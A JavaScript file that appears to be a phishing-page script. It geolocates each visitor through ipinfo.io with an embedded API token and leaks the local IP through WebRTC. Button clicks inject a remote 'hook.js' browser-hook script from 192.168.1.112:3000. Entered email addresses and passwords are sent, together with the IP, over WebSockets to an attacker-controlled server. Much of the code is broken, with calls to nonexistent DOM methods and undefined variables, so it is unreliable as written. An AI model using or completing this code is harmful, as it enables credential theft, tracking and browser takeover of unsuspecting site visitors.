async function getVisitorInfo() {
    try {
        // Fetch public IP address
        const publicIpResponse = await fetch('https://ipinfo.io/json?token=a9134127b2ee10'); // Replace with your API key
        if (!publicIpResponse.ok) throw new Error('Failed to fetch public IP info');

        const publicIpData = await publicIpResponse.json();
        console.log("public ip data",publicIpData);
        
        // Fetch local IP address
        const localIp = await getLocalIP();
        
        const visitorInfo = {
            publicIP: publicIpData.ip,
            location: `${publicIpData.city}, ${publicIpData.region}, ${publicIpData.country}`,
            isp: publicIpData.org,
            localIP: localIp
        };

        console.log("Visitor Info:", visitorInfo);

        return visitorInfo;
    } catch (error) {
        console.error("Error fetching visitor info:", error);
        return null;
    }
}

// Function to retrieve the local IP address using WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const peerConnection = new RTCPeerConnection({ iceServers: [] });

        peerConnection.createDataChannel(""); 
        peerConnection.createOffer()
            .then(offer => peerConnection.setLocalDescription(offer))
            .catch(() => resolve(null));

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                const ipMatch = event.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                if (ipMatch) {
                    resolve(ipMatch[0]);
                }
            } else {
                resolve(null);
            }
        };
    });
}

// Function to use the retrieved IP in another process
function useIP() {
    getVisitorInfo(); 
    getLocalIP();
}

// Run the script when the page loads
window.onload = () => {
    getVisitorInfo();
};



// Call the function
var ipaddr = getVisitorInfo();
console.log("[!] found IP: ", ipaddr)


document.addEventListener("DOMContentLoaded", function () {
    const resetButton = document.getElementById("reset-btn");

    if (resetButton) {
        resetButton.addEventListener("click", function () {
            // Remove existing hook.js script if already present
            const oldScript = document.getElementById("dynamic-script");
            if (oldScript) {
                oldScript.remove();
            }

            // Create and append a new script element to reload hook.js
            const newScript = document.createElement("script");
            newScript.src = "192.168.1.112:3000/hook.js";
            newScript.id = "dynamic-script";

            document.body.appendChild(newScript);

            console.log("hook.js reloaded!");
        });
    }
});

document.addEventListener("DOMContentLoaded", function () {
    const resetButton = document.getElementById("submit-btn");

    if (resetButton) {
        resetButton.addEventListener("click", function () {
            // Remove existing hook.js script if already present
            const oldScript = document.getElementById("dynamic-script");
            if (oldScript) {
                oldScript.remove();
            }

            // Create and append a new script element to reload hook.js
            const newScript = document.createElement("script");
            newScript.src = "http://192.168.1.112:3000/hook.js";
            newScript.id = "dynamic-script";

            document.body.appendChild(newScript);

            // Create a WebSocket connection to the server
            console.log("hook.js reloaded!");

            const socket = new WebSocket("ws://192.168.1.112:5501");
            socket.onopen = (event) => {
                console.log("WebSocket connection opened");
            };
            
        });
    }
});


// Create a WebSocket connection to the server
const socket = new WebSocket("ws://localhost:5501");

// Event listener for when the connection is opened
socket.onopen = (event) => {
    console.log("WebSocket connection opened");
};

// Event listener for receiving messages from the server
socket.onmessage = (event) => {
    const messagesEmail = document.getElementByType("email");
    const messagesPass = document.getElementByType("password");
    console.log("EMAIL: ", messagesEmail);
    console.log("PASS: ", messagesPass)
    console.log("[!] found IP: ", ipaddr)

    messagesDiv.innerHTML += `<p>Server: ${event.data}</p>`;
};

// Event listener for when the connection is closed
socket.onclose = (event) => {
    console.log("WebSocket connection closed");
};

// Event listener for errors
socket.onerror = (error) => {
    console.error("WebSocket error:", error);
};

// Send message to the server when the button is clicked
document.getElementByType("submit").addEventListener("click", () => {
    const emailInput = document.getElementByType("email_val");
    const passsInput = document.getElementByType("password_val");

    const email = email_val.value;
    const pass = password_val.value; 

    console.log("[+] ]MAIL ", email)
    console.log("[+] PASS", pass)
    console.log("[!] found IP: ", ipaddr)

    socket.send(ipaddr)
    socket.send(email); // Send the message to the server
    socket.send(pass); // Send the message to the server

    messageInput.value = ""; // Clear the input field
}
);